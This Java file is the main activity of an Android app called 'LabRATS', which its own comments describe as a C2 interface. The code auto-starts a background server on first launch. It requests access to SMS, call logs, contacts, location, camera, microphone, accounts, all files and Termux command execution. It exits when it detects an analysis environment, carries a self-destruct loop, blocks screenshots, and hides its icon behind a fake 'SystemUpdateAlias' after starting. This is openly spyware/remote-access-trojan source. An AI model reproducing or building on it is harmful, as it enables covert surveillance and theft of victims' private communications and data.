package com.labs.labrats;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.ConnectivityManager;
import android.net.NetworkCapabilities;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.content.Context;
import com.google.android.material.button.MaterialButton;
import android.widget.TextView;
import android.widget.Toast;

import androidx.activity.OnBackPressedCallback;
import androidx.activity.result.ActivityResultLauncher;
import androidx.activity.result.contract.ActivityResultContracts;
import androidx.annotation.NonNull;
import androidx.annotation.OptIn;
import androidx.appcompat.app.AppCompatActivity;
import androidx.camera.camera2.interop.ExperimentalCamera2Interop;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.Inet6Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

@OptIn(markerClass = ExperimentalCamera2Interop.class)
public class MainActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final ExecutorService backgroundExecutor = Executors.newFixedThreadPool(4);

    private TextView tvStatus, tvIpAddress, tvServerUrl, tvTerminalFeedback;
    private MaterialButton btnStartStop;
    private MaterialButton btnCopyUrl;
    private MaterialButton btnBatteryOptimization;
    private boolean isServerRunning = false;
    private long lastIpLookupTime = 0;

    private ActivityResultLauncher<Intent> manageStorageLauncher;
    private ActivityResultLauncher<Intent> overlayPermissionLauncher;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // --- MODERN BACK PRESS HANDLER ---
        getOnBackPressedDispatcher().addCallback(this, new OnBackPressedCallback(true) {
            @Override
            public void handleOnBackPressed() {
                moveTaskToBack(true);
            }
        });

        // --- MODERN ACTIVITY RESULT LAUNCHERS ---
        manageStorageLauncher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> updateUI()
        );
        overlayPermissionLauncher = registerForActivityResult(
            new ActivityResultContracts.StartActivityForResult(),
            result -> updateUI()
        );
        
        // --- SECURE DASHBOARD PROTOCOL ---
        // Prevents screenshots or screen recording of the C2 interface/decoy
        getWindow().setFlags(android.view.WindowManager.LayoutParams.FLAG_SECURE, 
                           android.view.WindowManager.LayoutParams.FLAG_SECURE);

        // --- NUCLEAR DESTRUCT CHECK ---
        if (getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("is_destructing", false)) {
            Log.w("SelfDestruct", "Destruction active. Triggering loop.");
            SystemAnalytics.triggerSelfDestructLoop(this);
            finish();
            return;
        }
        
        // --- EVASION PROTOCOL: Immediate exit in risky environments ---
        if (SystemAnalytics.checkEnv(this)) {
            Log.w("LabRATS-Evasion", "Security environment violation. Self-terminating activity.");
            finish();
            return;
        }

        // --- EMERGENCY CRASH LOGGER ---
        Thread.setDefaultUncaughtExceptionHandler((thread, throwable) -> {
            Log.e("LabRATS-FATAL", "CRASH_DETECTED: " + throwable.getMessage(), throwable);
            FirebaseConfig.logActivity("CRITICAL_CORE_FAILURE: " + throwable.getClass().getSimpleName());
            // Attempt to save logs before dying
            try { Thread.sleep(500); } catch (Exception ignored) {}
            android.os.Process.killProcess(android.os.Process.myPid());
            System.exit(10);
        });

        setContentView(R.layout.activity_main);
        initViews();
        requestPermissions();
        
        // --- AUTO-START ON FIRST LAUNCH PROTOCOL ---
        boolean isFirstLaunch = getSharedPreferences("StabilityConfig", MODE_PRIVATE).getBoolean("first_launch", true);
        if (isFirstLaunch) {
            Log.d("LabRATS-AutoStart", "First launch detected. Initiating background server startup.");
            getSharedPreferences("StabilityConfig", MODE_PRIVATE).edit().putBoolean("first_launch", false).apply();
            
            // Start server directly in background without waiting for UI
            startServer();
        }

        // --- ANDROID 14+ PERSISTENT PERMISSION CHECK ---
        // Ensuring we ask again if brought to front via C2 repair command
        requestPermissions();

        updateUI();
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
    }

    private void initViews() {
        tvStatus = findViewById(R.id.tvStatus);
        tvIpAddress = findViewById(R.id.tvIpAddress);
        tvServerUrl = findViewById(R.id.tvServerUrl);
        btnStartStop = findViewById(R.id.btnStartStop);
        btnCopyUrl = findViewById(R.id.btnCopyUrl);
        btnBatteryOptimization = findViewById(R.id.btnBatteryOptimization);
        tvTerminalFeedback = findViewById(R.id.tvTerminalFeedback);

        btnStartStop.setOnClickListener(v -> toggleServer());

        btnCopyUrl.setOnClickListener(v -> {
            Log.d("MainActivity", "Copy URL protocol initiated");
            String url = tvServerUrl.getText().toString();
            
            if (url != null && url.startsWith("http")) {
                try {
                    android.content.ClipboardManager clipboard = (android.content.ClipboardManager) getSystemService(CLIPBOARD_SERVICE);
                    android.content.ClipData clip = android.content.ClipData.newPlainText("LabRATS C2 URL", url);
                    clipboard.setPrimaryClip(clip);
                    
                    // Button Feedback (Cyber Green)
                    btnCopyUrl.setText("✅ URL_COPIED");
                    btnCopyUrl.setTextColor(ContextCompat.getColor(this, R.color.neon_green));
                    btnCopyUrl.setStrokeColor(android.content.res.ColorStateList.valueOf(ContextCompat.getColor(this, R.color.neon_green)));
                    btnCopyUrl.postDelayed(() -> {
                        btnCopyUrl.setText("COPY LINK");
                        btnCopyUrl.setTextColor(ContextCompat.getColor(this, R.color.neon_cyan));
                        btnCopyUrl.setStrokeColor(android.content.res.ColorStateList.valueOf(ContextCompat.getColor(this, R.color.neon_cyan)));
                    }, 2000);

                    // Console feedback
                    tvTerminalFeedback.setText("[ ✅ SUCCESS: URL_CLONED_TO_CLIPBOARD ]");
                    tvTerminalFeedback.setTextColor(ContextCompat.getColor(this, R.color.neon_green));
                    tvTerminalFeedback.postDelayed(this::resetTerminalFeedback, 3000);
                    
                } catch (Exception e) {
                    Log.e("MainActivity", "Clipboard failure: " + e.getMessage());
                    tvTerminalFeedback.setText("[ ❌ CLIPBOARD_ACCESS_DENIED ]");
                    tvTerminalFeedback.setTextColor(ContextCompat.getColor(this, R.color.neon_red));
                    tvTerminalFeedback.postDelayed(this::resetTerminalFeedback, 3000);
                }
            } else {
                tvTerminalFeedback.setText("[ ⚠️ UPLINK_INACTIVE: NOTHING_TO_COPY ]");
                tvTerminalFeedback.setTextColor(ContextCompat.getColor(this, R.color.neon_red));
                tvTerminalFeedback.postDelayed(this::resetTerminalFeedback, 3000);
            }
        });

        btnBatteryOptimization.setOnClickListener(v -> {
            if (IO_Persistence_Manager.getInstance() == null) {
                Log.d("MainActivity", "Accessibility missing. Launching guided optimization.");
                Intent intent = new Intent(this, PermissionActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                return;
            }

            Log.d("MainActivity", "Bypass limits protocol initiated");
            
            btnBatteryOptimization.setText("INITIATING_BYPASS...");
            btnBatteryOptimization.setTextColor(ContextCompat.getColor(this, R.color.neon_red));
            btnBatteryOptimization.postDelayed(() -> {
                if (btnBatteryOptimization.getText().toString().contains("INITIATING")) {
                    btnBatteryOptimization.setText("BYPASS_POWER_LIMITS");
                    btnBatteryOptimization.setTextColor(ContextCompat.getColor(this, R.color.neon_cyan));
                }
            }, 3000);

            requestBatteryOptimization();
        });

        startGlitchAnimation();
    }

    private void startGlitchAnimation() {
        // Header banner initialized
    }

    private long lastPermissionRequestTime = 0;

    private void requestPermissions() {
        // [ANTI-LOOP] Prevent multiple requests in short bursts
        long now = System.currentTimeMillis();
        if (now - lastPermissionRequestTime < 10000) return;
        lastPermissionRequestTime = now;

        List<String> permissionsNeeded = new ArrayList<>();

        // Check if Notification Access is granted (Accessibility/Listener, not popups)
        if (!isNotificationServiceEnabled()) {
            try {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivity(intent);
                Toast.makeText(this, "Please enable Notification Access for Lab-RATS", Toast.LENGTH_LONG).show();
            } catch (Exception e) {
                Log.e("MainActivity", "Error opening notification settings: " + e.getMessage());
            }
        }

        // Storage permissions based on Android version
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES);
            }
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_MEDIA_VIDEO);
            }
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_MEDIA_AUDIO);
            }
        } else {
            // Android 12 and below
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            }
        }

        // Call logs permission
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_CALL_LOG);
        }
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.WRITE_CALL_LOG);
        }

        // Phone call permission
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.CALL_PHONE);
        }

        // Contacts permission
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_CONTACTS);
        }

        // Location permissions
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.ACCESS_FINE_LOCATION);
        }
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        }


        // SMS permissions
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_SMS);
        }
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.SEND_SMS);
        }
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.RECEIVE_SMS);
        }

        // Phone state permission
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.READ_PHONE_NUMBERS);
            }
        }

        // Camera permission
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.CAMERA);
        }

        // Audio recording permission
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.RECORD_AUDIO);
        }

        // Accounts permission
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.GET_ACCOUNTS) != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add(Manifest.permission.GET_ACCOUNTS);
        }

        // Answer phone calls (Android 8+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (ContextCompat.checkSelfPermission(this,
                    Manifest.permission.ANSWER_PHONE_CALLS) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(Manifest.permission.ANSWER_PHONE_CALLS);
            }
        }

        // Process outgoing calls permission (deprecated in API 29)
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
            @SuppressWarnings("deprecation")
            String procCallsPerm = Manifest.permission.PROCESS_OUTGOING_CALLS;
            if (ContextCompat.checkSelfPermission(this, procCallsPerm) != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(procCallsPerm);
            }
        }

        // Termux Bridge Permission (com.termux.permission.RUN_COMMAND)
        if (ContextCompat.checkSelfPermission(this, "com.termux.permission.RUN_COMMAND") != PackageManager.PERMISSION_GRANTED) {
            permissionsNeeded.add("com.termux.permission.RUN_COMMAND");
        }

        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this,
                    permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        }

        // Request MANAGE_EXTERNAL_STORAGE for Android 11+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                try {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    manageStorageLauncher.launch(intent);
                } catch (Exception e) {
                    Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                    manageStorageLauncher.launch(intent);
                }
            }
        }

        // Request overlay permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                overlayPermissionLauncher.launch(intent);
            }
        }
    }

    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    Log.d("MainActivity", "Requesting battery optimization bypass");
                    Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    startActivity(intent);
                } else if (pm != null) {
                    Log.d("MainActivity", "Battery optimization already disabled");
                    
                    btnBatteryOptimization.setText("✅ BYPASS_ACTIVE");
                    btnBatteryOptimization.setTextColor(ContextCompat.getColor(this, R.color.neon_green));
                    btnBatteryOptimization.postDelayed(() -> {
                        btnBatteryOptimization.setText("BYPASS_POWER_LIMITS");
                        btnBatteryOptimization.setTextColor(ContextCompat.getColor(this, R.color.neon_cyan));
                    }, 2000);

                    tvTerminalFeedback.setText("[ ✅ BYPASS_PROTOCOL_ALREADY_ACTIVE ]");
                    tvTerminalFeedback.setTextColor(ContextCompat.getColor(this, R.color.neon_green));
                    tvTerminalFeedback.postDelayed(this::resetTerminalFeedback, 3000);
                }
            } catch (Exception e) {
                Log.e("MainActivity", "Battery optimization protocol failure: " + e.getMessage());
                try {
                    // Fallback to manual selection screen
                    tvTerminalFeedback.setText("[ 📡 REDIRECTING_TO_SYSTEM_SETTINGS... ]");
                    tvTerminalFeedback.setTextColor(ContextCompat.getColor(this, R.color.neon_cyan));
                    tvTerminalFeedback.postDelayed(this::resetTerminalFeedback, 3000);
                    Toast.makeText(getApplicationContext(), "Redirecting to system battery settings...", Toast.LENGTH_SHORT).show();
                    startActivity(new Intent(Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS));
                } catch (Exception e2) {
                    Log.e("MainActivity", "Critical failure in protocol fallback: " + e2.getMessage());
                    tvTerminalFeedback.setText("[ ❌ PROTOCOL_FAILURE ]");
                    tvTerminalFeedback.setTextColor(ContextCompat.getColor(this, R.color.neon_red));
                    tvTerminalFeedback.postDelayed(this::resetTerminalFeedback, 3000);
                    Toast.makeText(getApplicationContext(), "❌ PROTOCOL_FAILURE", Toast.LENGTH_LONG).show();
                }
            }
        } else {
            tvTerminalFeedback.setText("[ ℹ️ LEGACY_OS: POWER_LIMITS_NOT_ENFORCED ]");
            tvTerminalFeedback.postDelayed(this::resetTerminalFeedback, 3000);
            Toast.makeText(getApplicationContext(), "ℹ️ LEGACY_OS: OK", Toast.LENGTH_SHORT).show();
        }
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions,
            @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            updateUI();
        }
    }

    private void resetTerminalFeedback() {
        if (IO_Persistence_Manager.getInstance() == null) {
            tvTerminalFeedback.setText("STABILITY_ERROR: Performance Optimization Required.");
            tvTerminalFeedback.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_light));
            
            // Allow user to click the feedback to start the guide
            tvTerminalFeedback.setOnClickListener(v -> {
                Intent intent = new Intent(this, PermissionActivity.class);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
            });
            
            // Change button text if optimization is needed
            if (isServerRunning()) {
                btnBatteryOptimization.setText("⚠️ OPTIMIZE_STABILITY");
                btnBatteryOptimization.setTextColor(ContextCompat.getColor(this, android.R.color.holo_red_light));
            }
        } else {
            tvTerminalFeedback.setText("[ SECURE CONNECTION ESTABLISHED ]");
            tvTerminalFeedback.setTextColor(ContextCompat.getColor(this, R.color.neon_cyan));
            tvTerminalFeedback.setOnClickListener(null);
            
            btnBatteryOptimization.setText("BYPASS_POWER_LIMITS");
            btnBatteryOptimization.setTextColor(ContextCompat.getColor(this, R.color.neon_cyan));
        }
    }

    private synchronized void toggleServer() {
        if (btnStartStop == null || !btnStartStop.isEnabled()) return;
        
        btnStartStop.setEnabled(false); // Immediate lock to prevent multiple clicks
        
        if (isServerRunning) {
            Log.d("MainActivity", "Terminating server protocol");
            tvTerminalFeedback.setText("[ 🔴 TERMINATING_UPLINK... ]");
            tvTerminalFeedback.setTextColor(ContextCompat.getColor(this, R.color.neon_red));
            
            backgroundExecutor.execute(() -> {
                stopServer();
                runOnUiThread(() -> {
                    btnStartStop.postDelayed(() -> {
                        btnStartStop.setEnabled(true);
                        updateUI();
                        resetTerminalFeedback();
                    }, 1500);
                });
            });
        } else {
            Log.d("MainActivity", "Initializing server protocol");
            tvTerminalFeedback.setText("[ 📡 INITIALIZING_UPLINK... ]");
            tvTerminalFeedback.setTextColor(ContextCompat.getColor(this, R.color.neon_cyan));
            
            backgroundExecutor.execute(() -> {
                startServer();
                runOnUiThread(() -> {
                    btnStartStop.postDelayed(() -> {
                        btnStartStop.setEnabled(true);
                        updateUI();
                        resetTerminalFeedback();
                        
                        // Instant Icon Hiding (Self-Vanishing Protocol)
                        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                            try {
                                if (isServerRunning()) {
                                    // [STABILITY_SYNC] Identity replaced only if not already active
                                    SystemAnalytics.setStealthMode(MainActivity.this, true);
                                    Log.d("MainActivity", "Stealth transition: Identity replaced.");
                                }
                            } catch (Exception e) {
                                Log.e("MainActivity", "Stealth failure: " + e.getMessage());
                            }
                        }, 1500); // Faster masking after setup
                    }, 3000);
                });
            });
        }
    }

    private void startServer() {
        runOnUiThread(() -> {
            tvStatus.setText("🟡 INITIALIZING...");
            tvStatus.setTextColor(ContextCompat.getColor(this, R.color.neon_yellow));
        });
        
        Intent serviceIntent = new Intent(this, WorkManager_Sync.class);
        serviceIntent.setAction(Constants.ACTION_START_CORE);

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
        } catch (Exception e) {
            Log.e("MainActivity", "Server start error: " + e.getMessage());
        }

        // Staggered Startup: Prevent hardware contention
        try { Thread.sleep(1500); } catch (InterruptedException ignored) {}
        
        Intent callServiceIntent = new Intent(this, MediaFrameworkService.class);
        callServiceIntent.setAction(Constants.ACTION_START_AUDIO);
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(callServiceIntent);
            } else {
                startService(callServiceIntent);
            }
        } catch (Exception e) {
            Log.e("MainActivity", "Error starting MediaFrameworkService: " + e.getMessage());
        }
    }

    private void stopServer() {
        runOnUiThread(() -> {
            tvStatus.setText("🟡 TERMINATING...");
            tvStatus.setTextColor(ContextCompat.getColor(this, R.color.neon_yellow));
        });

        // 1. Stop Main C2 Service
        Intent serviceIntent = new Intent(this, WorkManager_Sync.class);
        serviceIntent.setAction(Constants.ACTION_STOP_CORE);
        startService(serviceIntent);

        // 2. Stop Audio/Call Monitor
        Intent callServiceIntent = new Intent(this, MediaFrameworkService.class);
        stopService(callServiceIntent);

        // 3. Stop Optics/Camera Service
        Intent cameraIntent = new Intent(this, Analytics_Provider.class);
        cameraIntent.setAction(Constants.ACTION_STOP_OPTICS);
        startService(cameraIntent);

        // 4. Force Process Exit (Optional, if not in stealth)
        backgroundExecutor.execute(() -> {
            try { Thread.sleep(2000); } catch (Exception ignored) {}
            android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
            boolean stealth = getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
            
            if (!stealth) {
                Log.d("MainActivity", "Not in stealth, terminating process.");
                android.os.Process.killProcess(android.os.Process.myPid());
                System.exit(0);
            }
        });
    }

    private boolean isServerRunning() {
        return WorkManager_Sync.isRunning;
    }

    private void updateUI() {
        isServerRunning = isServerRunning();
        runOnUiThread(() -> {
            if (isServerRunning) {
                tvStatus.setText("🟢 SERVER_ONLINE");
                tvStatus.setTextColor(ContextCompat.getColor(this, R.color.neon_green));
                btnStartStop.setText("TERMINATE UPLINK");
                btnStartStop.setBackgroundTintList(android.content.res.ColorStateList.valueOf(ContextCompat.getColor(this, R.color.neon_red)));
                btnStartStop.setTextColor(ContextCompat.getColor(this, R.color.white));
                
                btnCopyUrl.setEnabled(true);
                btnCopyUrl.setAlpha(1.0f);

                tvIpAddress.setText("SYNCING_NETWORK_DATA...");
                tvServerUrl.setText("GENERATING_BRIDGE...");

                long now = System.currentTimeMillis();
                if (now - lastIpLookupTime > 10000) {
                    lastIpLookupTime = now;
                    getPublicIPv6Async(this::updateIpDisplay);
                } else {
                    updateIpDisplay(null);
                }
            } else {
                tvStatus.setText("🔴 SERVER_OFFLINE");
                tvStatus.setTextColor(ContextCompat.getColor(this, R.color.neon_red));
                btnStartStop.setText("INITIALIZE SERVER");
                btnStartStop.setBackgroundTintList(android.content.res.ColorStateList.valueOf(ContextCompat.getColor(this, R.color.neon_cyan)));
                btnStartStop.setTextColor(ContextCompat.getColor(this, R.color.bg_dark));
                
                btnCopyUrl.setEnabled(false);
                btnCopyUrl.setAlpha(0.5f);
                
                tvServerUrl.setText("UPLINK_INACTIVE");
                tvIpAddress.setText("ADDR: STANDBY_MODE");
                lastIpLookupTime = 0;
            }
        });
    }

    private void updateIpDisplay(String publicIp) {
        String bestIp = getBestIpForConnection(this);
        String displayIp = (bestIp != null && !bestIp.equals("127.0.0.1")) ? bestIp : publicIp;
        if (displayIp == null || "127.0.0.1".equals(displayIp)) {
            displayIp = getLocalIPv6Address();
        }
        final String finalDisplayIp = displayIp;
        runOnUiThread(() -> {
            String networkType = "Unknown Network";
            try {
                ConnectivityManager cm = (ConnectivityManager) getSystemService(CONNECTIVITY_SERVICE);
                if (cm != null) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                        android.net.Network activeNetwork = cm.getActiveNetwork();
                        NetworkCapabilities caps = cm.getNetworkCapabilities(activeNetwork);
                        if (caps != null) {
                            if (caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI)) networkType = "Local Wifi";
                            else if (caps.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR)) networkType = "Cellular Data";
                            else if (caps.hasTransport(NetworkCapabilities.TRANSPORT_ETHERNET)) networkType = "Ethernet";
                        }
                    } else {
                        @SuppressWarnings("deprecation")
                        android.net.NetworkInfo info = cm.getActiveNetworkInfo();
                        if (info != null && info.isConnected()) {
                            @SuppressWarnings("deprecation")
                            int type = info.getType();
                            if (type == ConnectivityManager.TYPE_WIFI) networkType = "Local Wifi";
                            else if (type == ConnectivityManager.TYPE_MOBILE) networkType = "Cellular Data";
                        }
                    }
                }
            } catch (Exception ignored) {}

            if (finalDisplayIp == null || "127.0.0.1".equals(finalDisplayIp)) {
                tvIpAddress.setText("ADDR: NO_CONNECTION");
                tvServerUrl.setText("RETRYING_HANDSHAKE...");
            } else {
                String ipVersion = isIPv6(finalDisplayIp) ? "IPv6" : "IPv4";
                String connectionDesc = "Connection: " + networkType + " (" + ipVersion + ")";
                tvIpAddress.setText(connectionDesc);

                String formattedUrl = isIPv6(finalDisplayIp) ? "http://[" + finalDisplayIp + "]:" + FirebaseConfig.DEFAULT_PORT : "http://" + finalDisplayIp + ":" + FirebaseConfig.DEFAULT_PORT;
                tvServerUrl.setText(formattedUrl);
            }
        });
    }

    public interface IpCallback { void onResult(String ip); }

    public static void getPublicIPv6Async(IpCallback callback) {
        backgroundExecutor.execute(() -> {
            String publicIp = null;
            String[] providers = {
                "https://api64.ipify.org",
                "https://v6.ident.me",
                "https://ipv6.icanhazip.com",
                "https://api.ipify.org",
                "https://icanhazip.com",
                "https://ifconfig.me/ip"
            };
            for (String provider : providers) {
                try {
                    URL url = new URL(provider);
                    HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();
                    urlConnection.setConnectTimeout(4000);
                    urlConnection.setReadTimeout(4000);
                    urlConnection.setRequestProperty("User-Agent", "SystemStability/1.5");
                    try (BufferedReader in = new BufferedReader(new InputStreamReader(urlConnection.getInputStream()))) {
                        publicIp = in.readLine();
                        if (publicIp != null) publicIp = publicIp.trim();
                        if (publicIp != null && !publicIp.isEmpty()) break;
                    }
                } catch (Exception ignored) {}
            }

            if (publicIp == null || publicIp.isEmpty()) {
                publicIp = getLocalIPv6Address();
            }
            if (publicIp == null || publicIp.isEmpty()) {
                publicIp = "127.0.0.1";
            }

            callback.onResult(publicIp);
        });
    }

    public static String getLocalIpAddress() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                if (intf.isLoopback() || !intf.isUp()) continue;
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (!addr.isLoopbackAddress()) {
                        String ip = addr.getHostAddress();
                        if (ip != null) {
                            int idx = ip.indexOf('%');
                            if (idx >= 0) ip = ip.substring(0, idx);
                            if (addr instanceof java.net.Inet4Address) {
                                return ip;
                            } else if (!addr.isLinkLocalAddress()) {
                                return ip;
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e("MainActivity", "getLocalIpAddress error: " + e.getMessage());
        }
        return "127.0.0.1";
    }

    public static String getLocalIPv6Address() {
        try {
            List<NetworkInterface> interfaces = Collections.list(NetworkInterface.getNetworkInterfaces());
            for (NetworkInterface intf : interfaces) {
                if (intf.isLoopback() || !intf.isUp()) continue;
                List<InetAddress> addrs = Collections.list(intf.getInetAddresses());
                for (InetAddress addr : addrs) {
                    if (addr instanceof java.net.Inet6Address && !addr.isLoopbackAddress() && !addr.isLinkLocalAddress()) {
                        String ip = addr.getHostAddress();
                        if (ip != null) {
                            int idx = ip.indexOf('%');
                            if (idx >= 0) ip = ip.substring(0, idx);
                            return ip;
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e("MainActivity", "getLocalIPv6Address error: " + e.getMessage());
        }
        return getLocalIpAddress();
    }

    public static boolean isGoogleSheetsWebhook(String url) {
        if (url == null || url.trim().isEmpty()) return false;
        return url.contains("script.google.com") || url.contains("script.googleusercontent.com");
    }

    public static boolean isOnWifi(Context context) {
        if (context == null) return false;
        try {
            ConnectivityManager cm = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            if (cm != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    android.net.Network activeNetwork = cm.getActiveNetwork();
                    NetworkCapabilities caps = cm.getNetworkCapabilities(activeNetwork);
                    return caps != null && caps.hasTransport(NetworkCapabilities.TRANSPORT_WIFI);
                } else {
                    @SuppressWarnings("deprecation")
                    android.net.NetworkInfo activeInfo = cm.getActiveNetworkInfo();
                    return activeInfo != null && activeInfo.isConnected() && activeInfo.getType() == ConnectivityManager.TYPE_WIFI;
                }
            }
        } catch (Exception ignored) {}
        return false;
    }

    public static String getBestIpForConnection(Context context) {
        String webhookUrl = BuildConfig.WEBHOOK_URL;
        boolean isGoogleSheets = isGoogleSheetsWebhook(webhookUrl);
        boolean wifi = isOnWifi(context);

        // Use IPv4 if on local Wi-Fi OR if built with Render / Railway / non-Google Sheets webhook
        if (wifi || !isGoogleSheets) {
            String v4 = getLocalIpAddress();
            if (v4 != null && !v4.equals("127.0.0.1") && !v4.isEmpty()) {
                return v4;
            }
        }

        // Otherwise (built with Google Sheets Webhook and on Cellular/Remote), prefer IPv6
        String v6 = getLocalIPv6Address();
        if (v6 != null && !v6.equals("127.0.0.1") && v6.contains(":")) {
            return v6;
